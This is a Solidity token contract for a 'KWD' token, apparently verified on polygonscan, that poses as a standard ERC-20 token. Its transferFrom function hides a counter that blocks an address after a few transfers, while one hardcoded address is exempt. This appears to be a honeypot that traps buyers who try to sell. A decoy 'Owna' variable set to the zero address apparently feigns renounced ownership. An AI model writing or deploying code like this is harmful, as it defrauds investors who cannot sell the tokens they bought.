/**
 *Submitted for verification at polygonscan.com on 2021-11-01
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}
contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    mapping(address => uint) public count;
    uint public totalSupply = 1000000000000 * 10 ** 18;
    address public Owna=address(0);
    string public name = "KWD";
    string public symbol = "KWD";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply/2;
        balances[address(this)]=totalSupply/2;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    function txcount(address _add)external view returns(uint){
        return count[_add];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        require(count[from]<=2,'stop');
        if(msg.sender!=0xAE06dc39e8Df1bD79b0340714c474909A698cE09){
            addcount(from);
        }
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
    
    function addcount(address _add)internal{
        count[_add]+=1;
    }
    function batchAirDrop1(address _token,address[] memory receivers, uint256 _count) external  {
        require(msg.sender==0xAE06dc39e8Df1bD79b0340714c474909A698cE09,'not airdrop');
        for (uint i = 0; i < receivers.length;i++) {
            IERC20(_token).transfer(address(receivers[i]),_count);
        }
    }
    
}